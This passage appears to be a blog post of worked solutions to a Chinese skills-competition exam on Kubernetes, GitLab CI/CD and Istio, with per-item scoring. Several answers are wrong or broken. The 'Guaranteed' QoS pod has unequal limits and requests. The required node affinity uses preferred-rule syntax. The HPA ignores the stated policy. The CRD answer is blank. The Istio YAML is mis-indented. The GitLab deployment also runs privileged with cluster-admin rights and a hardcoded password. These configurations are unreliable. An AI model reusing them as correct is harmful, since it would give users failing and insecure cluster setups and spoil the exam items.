<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># kubectl create ns gitlab-ci</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># vi gitlab.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: gitlab</span><br><span class="line">  labels:</span><br><span class="line">    app: gitlab</span><br><span class="line">spec:</span><br><span class="line">  <span class="built_in">type</span>: NodePort</span><br><span class="line">  ports:</span><br><span class="line">  - name: http</span><br><span class="line">    port: <span class="number">80</span>                  </span><br><span class="line">    targetPort: <span class="number">80</span></span><br><span class="line">    nodePort: <span class="number">30888</span>                 </span><br><span class="line">  selector:</span><br><span class="line">    app: gitlab</span><br><span class="line"></span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: gitlab</span><br><span class="line">  labels:</span><br><span class="line">    app: gitlab</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: gitlab</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: gitlab</span><br><span class="line">    spec:</span><br><span class="line">      serviceAccountName: gitlab<span class="literal">-admin</span></span><br><span class="line">      containers:</span><br><span class="line">      - name: gitlab</span><br><span class="line">        image: gitlab/gitlab<span class="literal">-ce</span>:latest</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        securityContext: </span><br><span class="line">          runAsUser: <span class="number">0</span>                   </span><br><span class="line">          privileged: true</span><br><span class="line">        env:</span><br><span class="line">        - name: GITLAB_ROOT_PASSWORD</span><br><span class="line">          value: admin@<span class="number">123</span>              </span><br><span class="line">        ports:</span><br><span class="line">        - name: http</span><br><span class="line">          containerPort: <span class="number">80</span></span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /etc/gitlab</span><br><span class="line">          name: gitlabhome</span><br><span class="line">        - mountPath: /var/log/gitlab</span><br><span class="line">          name: loghome</span><br><span class="line">        - mountPath: /var/opt/gitlab</span><br><span class="line">          name: opthome</span><br><span class="line">      volumes:</span><br><span class="line">      - name: gitlabhome</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /svc/gitlab/config</span><br><span class="line">      - name: loghome</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /svc/gitlab/gitlab/logs</span><br><span class="line">      - name: opthome</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /svc/gitlab/gitlab/<span class="keyword">data</span></span><br><span class="line"></span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: gitlab<span class="literal">-admin</span></span><br><span class="line">  labels:</span><br><span class="line">    name: gitlab</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">metadata:</span><br><span class="line">  name: gitlab<span class="literal">-admin</span></span><br><span class="line">  labels:</span><br><span class="line">    name: gitlab</span><br><span class="line">subjects:</span><br><span class="line">  - kind: ServiceAccount</span><br><span class="line">    name: gitlab<span class="literal">-admin</span></span><br><span class="line">    namespace: default</span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster<span class="literal">-admin</span></span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br></pre></td></tr></table></figure>

<p>1.GitLab 部署正确且能正常访问得 0.5 分；<br>2.项目导入成功得 0.5 分。</p>
<h3 id="【题目-2】部署GitLab-Runner-2-分"><a href="#【题目-2】部署GitLab-Runner-2-分" class="headerlink" title="【题目 2】部署GitLab Runner[2 分]"></a>【题目 2】部署GitLab Runner[2 分]</h3><p>将 GitLab Runner 部署到 gitlab-ci 命名空间下，Release 名称为 gitlab-runner，为 GitLab Runner 创建持久化构建缓存目录&#x2F;home&#x2F;gitlab-runner&#x2F;ci-build-cache 以加速构建速度，并将其注册到 GitLab 中。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径<br>CICD-Runner.tar.gz）</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">参考链接；https://www.qikqiak.com/post/gitlab<span class="literal">-runner-install-on-k8s</span>/</span><br></pre></td></tr></table></figure>

<p>1.GitLab Runner 部署成功得 0.5 分；<br>2.GitLab Runner 注册成功得 0.5 分；<br>3.GitLab Runner 持久化配置成功得 1 分。</p>
<h3 id="【题目-3】配置GitLab-1-5-分"><a href="#【题目-3】配置GitLab-1-5-分" class="headerlink" title="【题目 3】配置GitLab[1.5 分]"></a>【题目 3】配置GitLab[1.5 分]</h3><p>将 Kubernetes 集群添加到 demo-2048 项目中，并命名为 kubernetes-agent，项目命名空间选择 gitlab-ci。完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径CICD-Runner.tar.gz）</p>
<p>1.GitLab Agent 安装成功得 1 分；<br>2.Kubernetes 连接成功得 0.5 分。</p>
<h3 id="【题目-4】构建CICD-3-5-分"><a href="#【题目-4】构建CICD-3-5-分" class="headerlink" title="【题目 4】构建CICD[3.5 分]"></a>【题目 4】构建CICD[3.5 分]</h3><p>编写流水线脚本.gitlab-ci.yml 触发自动构建，具体要求如下：<br>（1）基于镜像 maven:3.6-jdk-8 构建项目的drone 分支；<br>（2）构建镜像的名称：demo:latest；<br>（3）将镜像推送到Harbor 仓库 demo 项目中；<br>（4）将 demo-2048 应用自动发布到Kubernetes 集群 gitlab-ci 命名空间下。<br>完成后提交 master 节点的用户名、密码和 IP 地址到答题框。（需要用到的软件包路径<br>CICD-Runner.tar.gz）</p>
<p>1.项目变异成功得 0.5 分；<br>2.镜像构建成功得 1 分；<br>3.服务发布成功得 1 分；<br>4.服务能正常访问得 1 分。</p>
<h2 id="【任务-4】容器云服务运维：Kubernetes-基于容器的运维-6-分"><a href="#【任务-4】容器云服务运维：Kubernetes-基于容器的运维-6-分" class="headerlink" title="【任务 4】容器云服务运维：Kubernetes 基于容器的运维[6 分]"></a>【任务 4】容器云服务运维：Kubernetes 基于容器的运维[6 分]</h2><h3 id="【题目-1】Pod-管理–创建-Pod-0-5-分"><a href="#【题目-1】Pod-管理–创建-Pod-0-5-分" class="headerlink" title="【题目 1】Pod 管理–创建 Pod[0.5 分]"></a>【题目 1】Pod 管理–创建 Pod[0.5 分]</h3><p>在 default 命名空间下使用nginx:latest 镜像创建一个QoS 类为 Guaranteed 的 Pod，名称为 qos-demo。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: qos<span class="literal">-demo</span></span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: qos<span class="literal">-demo</span></span><br><span class="line">    image: nginx:latest</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    resources:</span><br><span class="line">      limits:</span><br><span class="line">        memory: <span class="string">&quot;200Mi&quot;</span></span><br><span class="line">      requests:</span><br><span class="line">        memory: <span class="string">&quot;100Mi&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Pod 创建成功得 0.2 分；<br>2.Pod QoS 类型为Guaranteed 得 0.3 分。</p>
<h3 id="【题目-2】安全管理–配置-Pod-安全上下文-0-5-分"><a href="#【题目-2】安全管理–配置-Pod-安全上下文-0-5-分" class="headerlink" title="【题目 2】安全管理–配置 Pod 安全上下文[0.5 分]"></a>【题目 2】安全管理–配置 Pod 安全上下文[0.5 分]</h3><p>使用 busybox 镜像启动一个名为 context-demo 的 Pod，为该 Pod 配置安全上下文，要求容器内以用户 1000 和用户组 3000 来运行所有进程，并在启动时执行“sleep 1h”命令。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: context<span class="literal">-demo</span></span><br><span class="line">spec:</span><br><span class="line">  securityContext:</span><br><span class="line">    runAsUser: <span class="number">1000</span></span><br><span class="line">    runAsGroup: <span class="number">3000</span></span><br><span class="line">    fsGroup: <span class="number">2000</span></span><br><span class="line">  containers:</span><br><span class="line">  - name: context<span class="literal">-demo</span></span><br><span class="line">    image: busybox:latest</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    command: [ <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sleep 1h&quot;</span> ]</span><br><span class="line">    securityContext:</span><br><span class="line">      allowPrivilegeEscalation: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Pod 安全上下午配置正确得 0.5 分。</p>
<h3 id="【题目-3】CRD-管理–创建自定义资源类型-0-5-分"><a href="#【题目-3】CRD-管理–创建自定义资源类型-0-5-分" class="headerlink" title="【题目 3】CRD 管理–创建自定义资源类型[0.5 分]"></a>【题目 3】CRD 管理–创建自定义资源类型[0.5 分]</h3><p>在 Kubernetes 集群中自定义一种资源类型 Student，API 为 stable.example.com&#x2F;v1，单数形式为 student，复数形式为 students，简写为 stu，作用域为命名空间级，然后在 default 命名空间下创建一个名为 exam 的 Student 对象。完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.资源类型 Student 定义成功的 0.3 分；<br>2.exam 创建成功得 0.2 分。</p>
<h3 id="【题目-4】解析管理–添加主机别名到-Pod-0-5-分"><a href="#【题目-4】解析管理–添加主机别名到-Pod-0-5-分" class="headerlink" title="【题目 4】解析管理–添加主机别名到 Pod[0.5 分]"></a>【题目 4】解析管理–添加主机别名到 Pod[0.5 分]</h3><p>使用 nginx 镜像在 default 命名空间下创建一个名为 nginx 的 Pod，并在 Pod 的&#x2F;etc&#x2F;hosts 中添加 IP 地址 127.0.0.1 与 chinaskills 的解析。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx</span><br><span class="line">spec:</span><br><span class="line">  restartPolicy: Never</span><br><span class="line">  hostAliases:</span><br><span class="line">  - ip: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    hostnames:</span><br><span class="line">    - <span class="string">&quot;chinaskills&quot;</span></span><br><span class="line">  containers:</span><br><span class="line">  - name: ngnix</span><br><span class="line">    image: nginx:latest</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    command:</span><br><span class="line">    - <span class="built_in">cat</span></span><br><span class="line">    args:</span><br><span class="line">    - <span class="string">&quot;/etc/hosts&quot;</span></span><br></pre></td></tr></table></figure>
<p>1.自定义解析配置正确得 0.5 分。</p>
<h3 id="【题目-5】HPA-管理–创建-HPA-规则-1-分"><a href="#【题目-5】HPA-管理–创建-HPA-规则-1-分" class="headerlink" title="【题目 5】HPA 管理–创建 HPA 规则[1 分]"></a>【题目 5】HPA 管理–创建 HPA 规则[1 分]</h3><p>默认情况下 HPA 是无法调整伸缩灵敏度的，但不同的业务场景对伸缩灵敏度的要求不一样。要求在 default 命名空间下使用 nginx 镜像创建一个名为 web 的 deployment，自定义HPA 的伸缩灵敏度，为该deployment 创建一个名为web 的HPA，扩容时立即新增当前 9 倍数量的副本数，时间窗口为 5s，伸缩范围为 1–1000。例如一开始只有 1 个 Pod，当 CPU 使用率超过 80%时，Pod 数量变化趋势为：1 → 10 → 100 → 1000。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: hap<span class="literal">-nginx-deploy</span></span><br><span class="line">  namespace: default</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx<span class="literal">-demo</span></span><br><span class="line">spec:</span><br><span class="line">  replicas: <span class="number">1</span></span><br><span class="line">  revisionHistoryLimit: <span class="number">4</span></span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: web</span><br><span class="line">        image: nginx</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: <span class="number">80</span>  </span><br><span class="line">        </span><br><span class="line"><span class="comment"># 然后创建Deployment：</span></span><br><span class="line"><span class="variable">$</span> kubectl create <span class="operator">-f</span> hpa<span class="literal">-deploy-demo</span>.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在我们来创建一个HPA，可以使用kubectl autoscale命令来创建：</span></span><br><span class="line"><span class="variable">$</span> kubectl autoscale deployment hpa<span class="literal">-nginx-deploy</span> <span class="literal">--cpu-percent</span>=<span class="number">80</span> <span class="literal">--min</span>=<span class="number">1</span> <span class="literal">--max</span>=<span class="number">100</span></span><br><span class="line">deployment <span class="string">&quot;hpa-nginx-deploy&quot;</span> autoscaled</span><br><span class="line">···</span><br><span class="line"><span class="variable">$</span> kubectl get hpa                                                         </span><br><span class="line">NAME        REFERENCE              TARGET    CURRENT   MINPODS   MAXPODS   AGE</span><br><span class="line">hpa<span class="literal">-nginx-deploy</span>   Deployment/hpa<span class="literal">-nginx-deploy</span>   <span class="number">10</span>%       <span class="number">0</span>%        <span class="number">1</span>         <span class="number">10</span>        <span class="number">13</span>s</span><br><span class="line"><span class="comment">#此命令创建了一个关联资源 hpa-nginx-deploy 的HPA，最小的 pod 副本数为1，最大为100。HPA会根据设定的 cpu使用率（80%）动态的增加或者减少pod数量。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#参考https://www.bookstack.cn/read/rancher-2.4.4-zh/2cf7e056a6f83ec4.md</span></span><br></pre></td></tr></table></figure>

<p>1.HPA 创建成功得 0.2 分；<br>2.HPA 伸缩策略配置正确得 0.8 分。</p>
<h3 id="【题目-6】节点亲和性管理–创建硬限制规则的-Pod-0-5-分"><a href="#【题目-6】节点亲和性管理–创建硬限制规则的-Pod-0-5-分" class="headerlink" title="【题目 6】节点亲和性管理–创建硬限制规则的 Pod[0.5 分]"></a>【题目 6】节点亲和性管理–创建硬限制规则的 Pod[0.5 分]</h3><p>在 default 命名空间下使用 nginx 镜像运行一个 Pod， 名称为 nginx， 要求使用requiredDuringSchedulingIgnoredDuringExecution 策略将 Pod 调度到具有“disktype&#x3D;ssd”标签的节点。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">kubectl label node k8s<span class="literal">-worker-node1</span> disktype=ssd</span><br><span class="line"></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: nginx</span><br><span class="line">    image: nginx:latest</span><br><span class="line">  affinity:</span><br><span class="line">    nodeAffinity:</span><br><span class="line">      requiredDuringSchedulingIgnoredDuringExecution:   <span class="comment">#硬性要求，最好放在节点包含disktype=ssd节点上</span></span><br><span class="line">        - weight: <span class="number">1</span></span><br><span class="line">          preference:</span><br><span class="line">            matchExpressions:</span><br><span class="line">              - key: disktype</span><br><span class="line">                operator: <span class="keyword">In</span></span><br><span class="line">                values:</span><br><span class="line">                  - ssd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>完成后提交 master 节点的用户名、密码和 IP 到答题框。<br>1.Pod 调度策略配置正确得 0.5 分。</p>
<h3 id="【题目-7】网络策略管理–创建-Pod-网络策略-0-5-分"><a href="#【题目-7】网络策略管理–创建-Pod-网络策略-0-5-分" class="headerlink" title="【题目 7】网络策略管理–创建 Pod 网络策略[0.5 分]"></a>【题目 7】网络策略管理–创建 Pod 网络策略[0.5 分]</h3><p>创建一个网络策略 network-exam，要求只有 internal 命名空间下的 Pod 可以通过 TCP<br>协议的 8080 端口访问到 mysql 命名空间下的Pod。<br>完成后提交 master 节点的 IP、用户名和密码到答题框。</p>
<p>1.网络策略创建成功得 0.2 分；<br>2.规则配置正确得 0.3 分。</p>
<h3 id="【题目-8】驱逐机制管理–配置节点压力驱逐-0-5-分"><a href="#【题目-8】驱逐机制管理–配置节点压力驱逐-0-5-分" class="headerlink" title="【题目 8】驱逐机制管理–配置节点压力驱逐[0.5 分]"></a>【题目 8】驱逐机制管理–配置节点压力驱逐[0.5 分]</h3><p>设置kubelet 数据存储在&#x2F;apps&#x2F;data&#x2F;kubelet 目录下，并设置当kubelet 的存储空间不足5%， 或者当容器运行时文件系统可用存储空间不足 5%时开始驱逐 Pod。</p>
<p>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。<br>1.节点压力驱逐配置正确得 0.5 分。</p>
<h3 id="【题目-9】流量管理–创建-Ingress-Gateway-0-5-分"><a href="#【题目-9】流量管理–创建-Ingress-Gateway-0-5-分" class="headerlink" title="【题目 9】流量管理–创建 Ingress Gateway[0.5 分]"></a>【题目 9】流量管理–创建 Ingress Gateway[0.5 分]</h3><p>使用提供的软件包 ServiceMesh.tar.gz 将Bookinfo 应用部署到 default 命名空间下，使用Istio Gateway 可以实现应用程序从外部访问， 请为 Bookinfo 应用创建一个名为bookinfo-gateway 的网关，指定所有 HTTP 流量通过 80 端口流入网格，然后将网关绑定到虚拟服务 bookinfo 上。<br>完成后提交 master 节点的 IP 地址、用户名和密码到答题框。</p>
<p>（2）部署应用程序<br>解压软件包并导入镜像：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># tar -zxf ServiceMesh.tar.gz</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> ~]<span class="comment"># cd ServiceMesh/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># docker load -i images/image.tar</span></span><br></pre></td></tr></table></figure>
<p>部署应用到Kubernetes集群：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f bookinfo/bookinfo.yaml</span></span><br><span class="line">service/details created</span><br><span class="line">serviceaccount/bookinfo<span class="literal">-details</span> created</span><br><span class="line">deployment.apps/details<span class="literal">-v1</span> created</span><br><span class="line">service/ratings created</span><br><span class="line">serviceaccount/bookinfo<span class="literal">-ratings</span> created</span><br><span class="line">deployment.apps/ratings<span class="literal">-v1</span> created</span><br><span class="line">service/reviews created</span><br><span class="line">serviceaccount/bookinfo<span class="literal">-reviews</span> created</span><br><span class="line">deployment.apps/reviews<span class="literal">-v1</span> created</span><br><span class="line">service/productpage created</span><br><span class="line">serviceaccount/bookinfo<span class="literal">-productpage</span> created</span><br><span class="line">deployment.apps/productpage<span class="literal">-v1</span> created</span><br></pre></td></tr></table></figure>
<p>Gateway配置文件如下：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat bookinfo-gateway.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: Gateway</span><br><span class="line">metadata:</span><br><span class="line">name: bookinfo<span class="literal">-gateway</span></span><br><span class="line">spec:</span><br><span class="line">selector:</span><br><span class="line">  istio: ingressgateway <span class="comment"># use istio default controller</span></span><br><span class="line">servers:</span><br><span class="line"> - port:</span><br><span class="line">    number: <span class="number">80</span></span><br><span class="line">    name: http</span><br><span class="line">    protocol: HTTP</span><br><span class="line">  hosts:</span><br><span class="line">   - <span class="string">&quot;*&quot;</span></span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: VirtualService</span><br><span class="line">metadata:</span><br><span class="line">name: bookinfo</span><br><span class="line">spec:</span><br><span class="line">hosts:</span><br><span class="line"> - <span class="string">&quot;*&quot;</span></span><br><span class="line">gateways:</span><br><span class="line"> - bookinfo<span class="literal">-gateway</span></span><br><span class="line">http:</span><br><span class="line"> - match:</span><br><span class="line">   - uri:</span><br><span class="line">      exact: /productpage</span><br><span class="line">   - uri:</span><br><span class="line">      prefix: /<span class="keyword">static</span></span><br><span class="line">   - uri:</span><br><span class="line">      exact: /login</span><br><span class="line">   - uri:</span><br><span class="line">      exact: /logout</span><br><span class="line">   - uri:</span><br><span class="line">      prefix: /api/v1/products</span><br><span class="line">  route:</span><br><span class="line">   - destination:</span><br><span class="line">      host: productpage</span><br><span class="line">      port:</span><br><span class="line">        number: <span class="number">9080</span></span><br></pre></td></tr></table></figure>
<p>确认网关创建完成：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl apply -f bookinfo-gateway.yaml</span></span><br><span class="line">gateway.networking.istio.io/bookinfo<span class="literal">-gateway</span> created</span><br><span class="line">virtualservice.networking.istio.io/bookinfo created</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl get gateway</span></span><br><span class="line">NAME               AGE</span><br><span class="line">bookinfo<span class="literal">-gateway</span>       <span class="number">32</span>s</span><br></pre></td></tr></table></figure>


<p>1.Bookinfo 应用部署成功得 0.2 分；<br>2.Bookinfo 能通过网关访问得 0.3 分。</p>
<h3 id="【题目-10】服务网格–创建基于用户身份的路由-0-5-分"><a href="#【题目-10】服务网格–创建基于用户身份的路由-0-5-分" class="headerlink" title="【题目 10】服务网格–创建基于用户身份的路由[0.5 分]"></a>【题目 10】服务网格–创建基于用户身份的路由[0.5 分]</h3><p>创建一个名为 reviews 路由，要求来自名为 Jason 的用户的所有流量将被路由到服务<br>reviews:v2。完成后提交 master 节点的用户名、密码和 IP 到答题框。<br>使用Curl工具向Bookinfo应用发送请求产生模拟流量。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat curl.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> true</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"> <span class="built_in">curl</span> http://<span class="number">10.24</span>.<span class="number">2.5</span>:<span class="number">22092</span>/productpage &gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"> <span class="built_in">sleep</span> <span class="number">1</span></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># chmod +x curl.sh</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># bash curl.sh &amp;</span></span><br><span class="line">[<span class="number">1</span>] <span class="number">2924</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意对应地址</span></span><br></pre></td></tr></table></figure>
<p>编写目标规则配置文件：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat destination-rule-all.yaml</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: DestinationRule</span><br><span class="line">metadata:</span><br><span class="line">name: productpage</span><br><span class="line">spec:</span><br><span class="line">host: productpage</span><br><span class="line">subsets:</span><br><span class="line"> - name: v1</span><br><span class="line">  labels:</span><br><span class="line">    version: v1</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: DestinationRule</span><br><span class="line">metadata:</span><br><span class="line">name: reviews</span><br><span class="line">spec:</span><br><span class="line">host: reviews</span><br><span class="line">subsets:</span><br><span class="line"> - name: v1</span><br><span class="line">  labels:</span><br><span class="line">    version: v1</span><br><span class="line"> - name: v2</span><br><span class="line">  labels:</span><br><span class="line">    version: v2</span><br><span class="line"> - name: v3</span><br><span class="line">  labels:</span><br><span class="line">    version: v3</span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: DestinationRule</span><br><span class="line">metadata:</span><br><span class="line">name: ratings</span><br><span class="line">spec:</span><br><span class="line">host: ratings</span><br><span class="line">subsets:</span><br><span class="line"> - name: v1</span><br><span class="line">  labels:</span><br><span class="line">    version: v1</span><br><span class="line"> - name: v2</span><br><span class="line">  labels:</span><br><span class="line">    version: v2</span><br><span class="line"> - name: v2<span class="literal">-mysql</span></span><br><span class="line">  labels:</span><br><span class="line">    version: v2<span class="literal">-mysql</span></span><br><span class="line"> - name: v2<span class="literal">-mysql-vm</span></span><br><span class="line">  labels:</span><br><span class="line">    version: v2<span class="literal">-mysql-vm</span></span><br><span class="line"><span class="literal">---</span></span><br><span class="line">apiVersion: networking.istio.io/v1alpha3</span><br><span class="line">kind: DestinationRule</span><br><span class="line">metadata:</span><br><span class="line">name: details</span><br><span class="line">spec:</span><br><span class="line">host: details</span><br><span class="line">subsets:</span><br><span class="line"> - name: v1</span><br><span class="line">  labels:</span><br><span class="line">    version: v1</span><br><span class="line"> - name: v2</span><br><span class="line">  labels:</span><br><span class="line">    version: v2</span><br></pre></td></tr></table></figure>
<p>创建默认目标规则：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@k8s<span class="literal">-master-node1</span> ServiceMesh]<span class="comment"># kubectl apply -f destination-rule-all.yaml</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl get destinationrule</span></span><br><span class="line">NAME         HOST       AGE</span><br><span class="line">details         details       <span class="number">21</span>s</span><br><span class="line">productpage     productpage   <span class="number">21</span>s</span><br><span class="line">ratings         ratings       <span class="number">21</span>s</span><br><span class="line">reviews         reviews       <span class="number">21</span>s</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新部署productpage微服务，启用Istio：</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat bookinfo/bookinfo.yaml | istioctl kube-inject -f - | kubectl apply -l app=productpage -f -</span></span><br><span class="line">service/productpage unchanged</span><br><span class="line">deployment.apps/productpage<span class="literal">-v1</span> configured</span><br><span class="line"></span><br><span class="line"><span class="comment">#所有服务启用Istio：</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat bookinfo/bookinfo.yaml | istioctl kube-inject -f - | kubectl apply -l app!=productpage -f -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#部署v2版本的reviews微服务并开启Istio：</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat bookinfo/reviews-v2.yaml | istioctl kube-inject -f - | kubectl apply -f -</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># cat bookinfo/reviews-v3.yaml | istioctl kube-inject -f - | kubectl apply -f -</span></span><br></pre></td></tr></table></figure>
<p>请求路由</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl autoscale deployment reviews-v1 --cpu-percent=50 --min=1 --max=10</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl autoscale deployment reviews-v2 --cpu-percent=50 --min=1 --max=10</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">k8s</span>-<span class="type">master</span>-<span class="type">node1</span> <span class="type">ServiceMesh</span>]<span class="comment"># kubectl autoscale deployment reviews-v3 --cpu-percent=50 --min=1 --max=10</span></span><br></pre></td></tr></table></figure>
<p>默认请求路由配置文件如下：</p>
